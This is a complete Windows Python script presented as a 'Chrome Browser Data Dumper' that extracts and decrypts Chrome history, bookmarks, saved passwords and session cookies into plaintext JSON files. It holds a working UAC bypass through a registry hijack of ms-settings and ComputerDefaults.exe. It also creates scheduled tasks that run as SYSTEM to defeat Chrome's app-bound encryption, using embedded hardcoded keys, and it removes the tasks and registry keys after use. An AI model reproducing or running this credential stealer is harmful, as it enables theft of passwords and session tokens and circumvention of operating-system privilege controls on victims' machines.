"""
Chrome Browser Data Dumper
Dumps: History, Bookmarks, Saved Passwords, Cookies

Requirements:
    pip install pywin32 pycryptodome
"""

import os
import json
import sqlite3
import shutil
import base64
import tempfile
import sys
import struct
import time
import subprocess
import ctypes
import ctypes.wintypes as _wt
import winreg
from pathlib import Path
from datetime import datetime, timedelta

try:
    import win32crypt
    HAS_WIN32CRYPT = True
except ImportError:
    HAS_WIN32CRYPT = False

try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

CHROME_PATH = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data"


# ---------------------------------------------------------------------------
# App-Bound Encryption helpers (Chrome 127+, v20 format)
# ---------------------------------------------------------------------------

def _helper_dpapi_main() -> None:
    """SYSTEM helper mode: CryptUnprotectData(argv[2]) -> argv[3], error -> argv[4]."""
    cipher_file, result_file, err_file = sys.argv[2], sys.argv[3], sys.argv[4]
    crypt32 = ctypes.WinDLL('crypt32', use_last_error=True)

    class _BLOB(ctypes.Structure):
        _fields_ = [('cbData', _wt.DWORD), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]

    with open(cipher_file, 'rb') as f:
        data = f.read()
    in_b = _BLOB(len(data), (ctypes.c_ubyte * len(data))(*data))
    out_b = _BLOB()
    ok = crypt32.CryptUnprotectData(ctypes.byref(in_b), None, None, None, None, 0, ctypes.byref(out_b))
    if ok:
        with open(result_file, 'wb') as f:
            f.write(bytes(out_b.pbData[:out_b.cbData]))
    else:
        with open(err_file, 'w') as f:
            f.write(hex(ctypes.get_last_error() & 0xFFFFFFFF))

def _helper_ncrypt_main() -> None:
    """SYSTEM helper mode: NCrypt decrypt argv[2] -> argv[3], error -> argv[4]."""
    input_file, result_file, err_file = sys.argv[2], sys.argv[3], sys.argv[4]
    ncrypt_dll = ctypes.WinDLL("ncrypt.dll")
    NCRYPT_SILENT_FLAG = 0x40

    with open(input_file, 'r') as f:
        data = bytes.fromhex(f.read().strip())

    hProvider = ctypes.c_void_p(0)
    status = ncrypt_dll.NCryptOpenStorageProvider(
        ctypes.byref(hProvider),
        ctypes.c_wchar_p("Microsoft Software Key Storage Provider"),
        ctypes.c_ulong(0)
    )
    if status != 0:
        open(err_file, 'w').write(f"NCryptOpenStorageProvider failed: {status:#010x}")
        return

    hKey = ctypes.c_void_p(0)
    status = ncrypt_dll.NCryptOpenKey(
        hProvider,
        ctypes.byref(hKey),
        ctypes.c_wchar_p("Google Chromekey1"),
        ctypes.c_ulong(0),
        ctypes.c_ulong(0)
    )
    if status != 0:
        open(err_file, 'w').write(f"NCryptOpenKey failed: {status:#010x}")
        ncrypt_dll.NCryptFreeObject(hProvider)
        return

    input_buf = (ctypes.c_ubyte * len(data))(*data)
    pcbResult = ctypes.c_ulong(0)

    ncrypt_dll.NCryptDecrypt(
        hKey, input_buf, ctypes.c_ulong(len(data)),
        None, None, ctypes.c_ulong(0),
        ctypes.byref(pcbResult), ctypes.c_ulong(NCRYPT_SILENT_FLAG)
    )
    out_size = pcbResult.value if pcbResult.value > 0 else len(data)
    output_buf = (ctypes.c_ubyte * out_size)()

    status = ncrypt_dll.NCryptDecrypt(
        hKey, input_buf, ctypes.c_ulong(len(data)),
        None, output_buf, ctypes.c_ulong(out_size),
        ctypes.byref(pcbResult), ctypes.c_ulong(NCRYPT_SILENT_FLAG)
    )
    ncrypt_dll.NCryptFreeObject(hKey)
    ncrypt_dll.NCryptFreeObject(hProvider)
    if status != 0:
        open(err_file, 'w').write(f"NCryptDecrypt failed: {status:#010x}")
        return

    open(result_file, 'w').write(bytes(output_buf[:pcbResult.value]).hex())

# Hardcoded keys embedded in Chrome's elevation_service.exe (per security research)
# Flag 1 (Chrome 127-132): AES-256-GCM key
_FLAG1_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
# Flag 2 (Chrome 133-136): ChaCha20-Poly1305 key
_FLAG2_KEY = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
# Flag 3 (Chrome 137+): XOR key for post-NCrypt obfuscation
_FLAG3_XOR = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")


def _outer_dpapi_as_system(ciphertext: bytes) -> bytes:
    """Decrypt outer DPAPI layer (encrypted by SYSTEM) via a scheduled task.

    Requires the script to be run with administrator privileges.
    """
    import uuid
    run_id = uuid.uuid4().hex[:8]
    # C:\Windows\Temp is always writable by SYSTEM; C:\Temp fallback
    for base in (
        os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "Temp"),
        r"C:\Temp",
        tempfile.gettempdir(),
    ):
        try:
            tmpdir = os.path.join(base, f"abk_{run_id}")
            os.makedirs(tmpdir, exist_ok=True)
            break
        except PermissionError:
            continue
    else:
        raise PermissionError("Could not create temp dir for SYSTEM task")
    cipher_file = os.path.join(tmpdir, "c.bin")
    result_file = os.path.join(tmpdir, "r.bin")
    err_file = os.path.join(tmpdir, "e.txt")
    task_name = "ChromeOSCryptHelper"

    with open(cipher_file, "wb") as f:
        f.write(ciphertext)

    xml_file = os.path.join(tmpdir, "task.xml")
    # Use Task XML to avoid all command-line / PowerShell quoting issues.
    # Paths with spaces are safely embedded inside double-quoted Arguments in the XML.
    if getattr(sys, 'frozen', False):
        helper_args = f'"--_helper-dpapi" "{cipher_file}" "{result_file}" "{err_file}"'
    else:
        script_path = os.path.abspath(sys.argv[0])
        helper_args = f'"{script_path}" "--_helper-dpapi" "{cipher_file}" "{result_file}" "{err_file}"'
    task_xml = (
        '<?xml version="1.0" encoding="UTF-16"?>\n'
        '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
        '  <Principals><Principal id="Author">'
        "<UserId>S-1-5-18</UserId>"
        "<RunLevel>HighestAvailable</RunLevel>"
        "</Principal></Principals>\n"
        '  <Actions Context="Author"><Exec>\n'
        f"    <Command>{sys.executable}</Command>\n"
        f'    <Arguments>{helper_args}</Arguments>\n'
        "  </Exec></Actions>\n"
        "</Task>\n"
    )
    with open(xml_file, "w", encoding="utf-16") as f:
        f.write(task_xml)

    try:
        subprocess.run(
            ["schtasks", "/create", "/f", "/tn", task_name, "/xml", xml_file],
            check=True, capture_output=True,
        )
        subprocess.run(["schtasks", "/run", "/tn", task_name], check=True, capture_output=True)

        deadline = time.time() + 30
        while time.time() < deadline:
            time.sleep(0.5)
            if os.path.exists(result_file) or os.path.exists(err_file):
                break

        if os.path.exists(err_file):
            with open(err_file) as f:
                raise RuntimeError(f"SYSTEM DPAPI failed: {f.read()}")
        if not os.path.exists(result_file):
            raise TimeoutError("SYSTEM scheduled task timed out (>30s)")

        with open(result_file, "rb") as f:
            return f.read()
    finally:
        subprocess.run(["schtasks", "/delete", "/f", "/tn", task_name], capture_output=True)
        shutil.rmtree(tmpdir, ignore_errors=True)


def _ncrypt_decrypt_as_system(data: bytes) -> bytes:
    """Decrypt data using CNG key 'Google Chromekey1' from SYSTEM's KSP via scheduled task."""
    import uuid
    run_id = uuid.uuid4().hex[:8]
    for base in (
        os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "Temp"),
        r"C:\Temp",
        tempfile.gettempdir(),
    ):
        try:
            tmpdir = os.path.join(base, f"nc_{run_id}")
            os.makedirs(tmpdir, exist_ok=True)
            break
        except PermissionError:
            continue
    else:
        raise PermissionError("Could not create temp dir for NCrypt SYSTEM task")

    input_file = os.path.join(tmpdir, "i.hex")
    result_file = os.path.join(tmpdir, "r.hex")
    err_file = os.path.join(tmpdir, "e.txt")
    task_name = "ChromeNCryptHelper"

    with open(input_file, "w") as f:
        f.write(data.hex())

    xml_file = os.path.join(tmpdir, "task.xml")
    if getattr(sys, 'frozen', False):
        helper_args = f'"--_helper-ncrypt" "{input_file}" "{result_file}" "{err_file}"'
    else:
        script_path = os.path.abspath(sys.argv[0])
        helper_args = f'"{script_path}" "--_helper-ncrypt" "{input_file}" "{result_file}" "{err_file}"'
    task_xml = (
        '<?xml version="1.0" encoding="UTF-16"?>\n'
        '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
        '  <Principals><Principal id="Author">'
        "<UserId>S-1-5-18</UserId>"
        "<RunLevel>HighestAvailable</RunLevel>"
        "</Principal></Principals>\n"
        '  <Actions Context="Author"><Exec>\n'
        f"    <Command>{sys.executable}</Command>\n"
        f'    <Arguments>{helper_args}</Arguments>\n'
        "  </Exec></Actions>\n"
        "</Task>\n"
    )
    with open(xml_file, "w", encoding="utf-16") as f:
        f.write(task_xml)

    try:
        subprocess.run(
            ["schtasks", "/create", "/f", "/tn", task_name, "/xml", xml_file],
            check=True, capture_output=True,
        )
        subprocess.run(["schtasks", "/run", "/tn", task_name], check=True, capture_output=True)

        deadline = time.time() + 30
        while time.time() < deadline:
            time.sleep(0.5)
            if os.path.exists(result_file) or os.path.exists(err_file):
                break

        if os.path.exists(err_file):
            with open(err_file) as f:
                raise RuntimeError(f"NCrypt SYSTEM decrypt failed: {f.read()}")
        if not os.path.exists(result_file):
            raise TimeoutError("NCrypt SYSTEM scheduled task timed out (>30s)")

        with open(result_file, "r") as f:
            return bytes.fromhex(f.read().strip())
    finally:
        subprocess.run(["schtasks", "/delete", "/f", "/tn", task_name], capture_output=True)
        shutil.rmtree(tmpdir, ignore_errors=True)


def get_app_bound_key() -> bytes:
    """Decrypt the Chrome 127+ App-Bound AES key used for v20 password encryption.

    Decryption chain (from Chromium elevator.cc + security research):
      1. Strip 'APPB' prefix, outer-DPAPI (SYSTEM), inner-DPAPI (user)
      2. Parse [val_len][validation][content_len][flag][...]
      3a. Flag 1 (Chrome 127-132): AES-GCM with hardcoded key -> 32-byte master key
      3b. Flag 2 (Chrome 133-136): ChaCha20-Poly1305 with hardcoded key -> 32-byte master key
      3c. Flag 3 (Chrome 137+):  NCrypt("Google Chromekey1") XOR AES-GCM -> 32-byte master key
    """
    ls_path = CHROME_PATH / "Local State"
    with open(ls_path, "r", encoding="utf-8") as f:
        ls = json.load(f)

    raw = base64.b64decode(ls["os_crypt"]["app_bound_encrypted_key"])
    if raw[:4] != b"APPB":
        raise ValueError(f"Unexpected app_bound_encrypted_key prefix: {raw[:4]!r}")

    # Step 1: outer DPAPI — runs as SYSTEM via scheduled task
    intermediate = _outer_dpapi_as_system(raw[4:])

    # Step 2: inner DPAPI — user context, no entropy
    crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)

    class _BLOB(ctypes.Structure):
        _fields_ = [("cbData", _wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    in_b = _BLOB(len(intermediate), (ctypes.c_ubyte * len(intermediate))(*intermediate))
    out_b = _BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(in_b), None, None, None, None, 0, ctypes.byref(out_b)):
        raise RuntimeError(f"User DPAPI decryption failed: {hex(ctypes.get_last_error())}")

    payload = bytes(out_b.pbData[:out_b.cbData])

    # Step 3: parse [uint32 val_len][validation_data][uint32 content_len][content]
    off = 0
    val_len = struct.unpack_from("<I", payload, off)[0]
    off += 4 + val_len
    content_len = struct.unpack_from("<I", payload, off)[0]
    off += 4
    content = payload[off : off + content_len]

    if not content:
        raise ValueError("Empty content in app-bound key payload")

    flag = content[0]

    if not HAS_CRYPTO:
        raise ImportError("pycryptodome is required. Install: pip install pycryptodome")

    if flag == 1:
        # Chrome 127-132: AES-256-GCM with hardcoded elevation_service.exe key
        iv  = content[1:13]
        ct  = content[13:45]
        tag = content[45:61]
        cipher = AES.new(_FLAG1_KEY, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(ct, tag)

    elif flag == 2:
        # Chrome 133-136: ChaCha20-Poly1305 with hardcoded elevation_service.exe key
        try:
            from Crypto.Cipher import ChaCha20_Poly1305
        except ImportError:
            raise ImportError("pycryptodome >= 3.9 required for ChaCha20-Poly1305")
        iv  = content[1:13]
        ct  = content[13:45]
        tag = content[45:61]
        cipher = ChaCha20_Poly1305.new(key=_FLAG2_KEY, nonce=iv)
        return cipher.decrypt_and_verify(ct, tag)

    elif flag == 3:
        # Chrome 137+: NCrypt key "Google Chromekey1" (SYSTEM KSP) -> XOR -> AES-GCM
        encrypted_aes_key = content[1:33]    # 32 bytes  (CNG-encrypted)
        iv               = content[33:45]   # 12 bytes
        ct               = content[45:77]   # 32 bytes
        tag              = content[77:93]   # 16 bytes

        # Decrypt the wrapped AES key using SYSTEM's CNG key store
        decrypted_aes_key = _ncrypt_decrypt_as_system(encrypted_aes_key)

        # Remove XOR obfuscation layer
        actual_aes_key = bytes(a ^ b for a, b in zip(decrypted_aes_key, _FLAG3_XOR))

        # Recover the 32-byte master key
        cipher = AES.new(actual_aes_key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(ct, tag)

    else:
        raise ValueError(f"Unsupported app-bound key flag: {flag:#04x}")


def get_encryption_key() -> bytes:
    """Read & decrypt the AES master key stored in Chrome's Local State file."""
    local_state_path = CHROME_PATH / "Local State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    b64_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(b64_key)[5:]  # strip 'DPAPI' prefix

    if not HAS_WIN32CRYPT:
        raise ImportError("pywin32 is required. Install: pip install pywin32")

    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key


def decrypt_value(
    key: bytes, encrypted_value: bytes, app_bound_key: bytes | None = None,
    strip_v20_prefix: bool = False,
) -> str:
    """Decrypt an AES-256-GCM encrypted browser value (v10/v11/v20 prefix).

    strip_v20_prefix: set True for cookie values — Chrome prepends 32 bytes of
    binding-policy data to the plaintext for v20 cookies (not passwords).
    """
    if not encrypted_value:
        return ""

    prefix = encrypted_value[:3]

    if prefix == b"v20":
        if app_bound_key is None:
            return "<v20: app-bound key unavailable>"
        aes_key = app_bound_key
    elif prefix in (b"v10", b"v11"):
        aes_key = key
    else:
        # Old-style DPAPI-encrypted value
        if HAS_WIN32CRYPT:
            try:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(
                    "utf-8", errors="replace"
                )
            except Exception:
                pass
        return "<decryption failed>"

    if not HAS_CRYPTO:
        raise ImportError("pycryptodome is required. Install: pip install pycryptodome")
    nonce = encrypted_value[3:15]
    ciphertext = encrypted_value[15:-16]
    tag = encrypted_value[-16:]
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    except Exception:
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt(ciphertext)
    if strip_v20_prefix and prefix == b"v20" and len(plaintext) > 32:
        plaintext = plaintext[32:]
    return plaintext.decode("utf-8", errors="replace")


def chrome_time(ts: int) -> str | None:
    """Convert Chrome/Chromium microsecond timestamp to ISO string."""
    if not ts:
        return None
    try:
        dt = datetime(1601, 1, 1) + timedelta(microseconds=ts)
        return dt.isoformat()
    except Exception:
        return None


def _win_copy_file(src: str, dst: str) -> None:
    """Copy a file using Windows CreateFile with full share flags (works on locked files)."""
    import ctypes
    import ctypes.wintypes as wt

    GENERIC_READ = 0x80000000
    FILE_SHARE_ALL = 0x00000007
    OPEN_EXISTING = 3
    FILE_ATTRIBUTE_NORMAL = 0x80

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    handle = kernel32.CreateFileW(src, GENERIC_READ, FILE_SHARE_ALL, None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
    if handle == wt.HANDLE(-1).value:
        raise OSError(ctypes.get_last_error(), f"Cannot open {src}")

    with open(dst, "wb") as out:
        buf = ctypes.create_string_buffer(65536)
        bytes_read = wt.DWORD(0)
        while True:
            ok = kernel32.ReadFile(handle, buf, len(buf), ctypes.byref(bytes_read), None)
            if not ok or bytes_read.value == 0:
                break
            out.write(buf.raw[: bytes_read.value])
    kernel32.CloseHandle(handle)


def _copy_db(src: Path) -> str:
    """Copy a (possibly locked) SQLite database + WAL to a temp dir and return the DB path.

    Also copies the -wal file so that uncheckpointed data is visible when opened
    in read-only mode (without immutable=1).
    """
    tmp_dir = tempfile.mkdtemp()
    tmp_db = os.path.join(tmp_dir, "db.sqlite")
    _win_copy_file(str(src), tmp_db)

    # Copy WAL if present (contains uncheckpointed transactions)
    wal_src = str(src) + "-wal"
    if os.path.exists(wal_src):
        _win_copy_file(wal_src, tmp_db + "-wal")

    return tmp_db


# ---------------------------------------------------------------------------
# Bookmarks
# ---------------------------------------------------------------------------

def dump_bookmarks() -> list[dict]:
    path = CHROME_PATH / "Default" / "Bookmarks"
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)

    results: list[dict] = []

    def traverse(node: dict, folder: str = "") -> None:
        if node.get("type") == "url":
            results.append(
                {
                    "folder": folder,
                    "name": node.get("name", ""),
                    "url": node.get("url", ""),
                    "date_added": chrome_time(int(node.get("date_added", 0))),
                }
            )
        elif "children" in node:
            child_folder = node.get("name", folder)
            for child in node["children"]:
                traverse(child, child_folder)

    for root in data.get("roots", {}).values():
        traverse(root)

    return results


# ---------------------------------------------------------------------------
# History
# ---------------------------------------------------------------------------

def _open_db(tmp_path: str) -> sqlite3.Connection:
    """Load a copied SQLite DB (+ WAL) into an in-memory connection, then clean up the temp dir."""
    # Open read-only (not immutable) so SQLite applies the WAL before we backup
    src_conn = sqlite3.connect(f"file:{tmp_path}?mode=ro", uri=True)
    mem_conn = sqlite3.connect(":memory:")
    src_conn.backup(mem_conn)
    src_conn.close()
    # Clean up entire temp dir (db + wal + shm)
    shutil.rmtree(os.path.dirname(tmp_path), ignore_errors=True)
    return mem_conn


def dump_history() -> list[dict]:
    tmp = _copy_db(CHROME_PATH / "Default" / "History")
    conn = _open_db(tmp)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC"
    )
    results = [
        {
            "url": url,
            "title": title,
            "visit_count": visit_count,
            "last_visit": chrome_time(last_visit_time),
        }
        for url, title, visit_count, last_visit_time in cursor.fetchall()
    ]
    conn.close()
    return results


# ---------------------------------------------------------------------------
# Passwords
# ---------------------------------------------------------------------------

def dump_passwords(key: bytes, app_bound_key: bytes | None = None) -> list[dict]:
    tmp = _copy_db(CHROME_PATH / "Default" / "Login Data")
    conn = _open_db(tmp)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT origin_url, username_value, password_value, date_created FROM logins ORDER BY date_created DESC"
    )
    results = [
        {
            "url": origin_url,
            "username": username,
            "password": decrypt_value(key, password_value, app_bound_key),
            "date_created": chrome_time(date_created),
        }
        for origin_url, username, password_value, date_created in cursor.fetchall()
    ]
    conn.close()
    return results


# ---------------------------------------------------------------------------
# Cookies
# ---------------------------------------------------------------------------

def dump_cookies(key: bytes, app_bound_key: bytes | None = None) -> list[dict]:
    # Newer Chrome versions store cookies under Network/Cookies
    cookies_path = CHROME_PATH / "Default" / "Network" / "Cookies"
    if not cookies_path.exists():
        cookies_path = CHROME_PATH / "Default" / "Cookies"

    tmp = _copy_db(cookies_path)
    conn = _open_db(tmp)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies ORDER BY host_key"
    )
    results = [
        {
            "host": host_key,
            "name": name,
            "value": decrypt_value(key, encrypted_value, app_bound_key, strip_v20_prefix=True),
            "path": path,
            "expires": chrome_time(expires_utc),
            "secure": bool(is_secure),
        }
        for host_key, name, encrypted_value, path, expires_utc, is_secure in cursor.fetchall()
    ]
    conn.close()
    return results


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def save(data: list, filename: str) -> None:
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    print(f"  -> {filename}  ({len(data)} records)")


def computer_defaults_bypass() -> None:
    """UAC bypass via ms-settings\\Shell\\Open\\command registry hijack (no UAC prompt)."""
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
    cwd = os.getcwd()

    if getattr(sys, 'frozen', False):
        # PyInstaller exe: run directly, no cmd.exe wrapper (avoids visible console window)
        elevated_cmd = f'"{sys.executable}" --elevated "{cwd}"'
    else:
        python_exe = sys.executable
        script_path = os.path.abspath(sys.argv[0])
        elevated_cmd = f'"{python_exe}" "{script_path}" --elevated "{cwd}"'

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, elevated_cmd)
        winreg.CloseKey(key)

        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"], shell=True)

        time.sleep(3)
        subprocess.run(['reg', 'delete', r'HKCU\Software\Classes\ms-settings', '/f'], capture_output=True)
    except Exception as e:
        print(f"[-] Bypass failed: {e}")


def _is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def main() -> None:
    # Helper modes: invoked as SYSTEM by scheduled tasks (no UAC needed)
    if len(sys.argv) > 1 and sys.argv[1] == '--_helper-dpapi':
        _helper_dpapi_main()
        return
    if len(sys.argv) > 1 and sys.argv[1] == '--_helper-ncrypt':
        _helper_ncrypt_main()
        return

    # Auto-elevate if not running as administrator (needed for SYSTEM scheduled task)
    if "--elevated" in sys.argv:
        # Re-launched with elevation by computer_defaults_bypass().
        # Restore original working directory passed as the next argument.
        try:
            idx = sys.argv.index("--elevated")
            original_cwd = sys.argv[idx + 1]
            os.chdir(original_cwd)
        except (IndexError, FileNotFoundError):
            pass
    elif not _is_admin():
        computer_defaults_bypass()
        sys.exit(0)

    print("=== Chrome Browser Data Dumper ===\n")

    if not CHROME_PATH.exists():
        print(f"Chrome profile not found: {CHROME_PATH}")
        sys.exit(1)

    # v10/v11 encryption key
    key: bytes | None = None
    print("Obtaining encryption key (v10/v11)...")
    try:
        key = get_encryption_key()
        print("  OK\n")
    except Exception as e:
        print(f"  WARNING: {e}")
        print("  Passwords and cookies will be skipped.\n")

    # v20 App-Bound key (Chrome 127+) — requires admin to run scheduled task as SYSTEM
    app_bound_key: bytes | None = None
    print("Obtaining app-bound key (v20, Chrome 127+)...")
    print("  NOTE: requires administrator privileges (creates a SYSTEM scheduled task)")
    try:
        app_bound_key = get_app_bound_key()
        print("  OK  (key length: " + str(len(app_bound_key)) + " bytes)\n")
    except Exception as e:
        print(f"  WARNING: {e}")
        print("  v20-encrypted passwords/cookies will show <v20: app-bound key unavailable>\n")

    # Bookmarks
    print("Bookmarks...")
    try:
        save(dump_bookmarks(), "bookmarks.json")
    except Exception as e:
        print(f"  ERROR: {e}")

    # History
    print("History...")
    try:
        save(dump_history(), "history.json")
    except Exception as e:
        print(f"  ERROR: {e}")

    if key is not None:
        # Passwords
        print("Passwords...")
        try:
            save(dump_passwords(key, app_bound_key), "passwords.json")
        except Exception as e:
            print(f"  ERROR: {e}")

        # Cookies
        print("Cookies...")
        try:
            save(dump_cookies(key, app_bound_key), "cookies.json")
        except Exception as e:
            print(f"  ERROR: {e}")

    print("\nDone.")


if __name__ == "__main__":
    main()
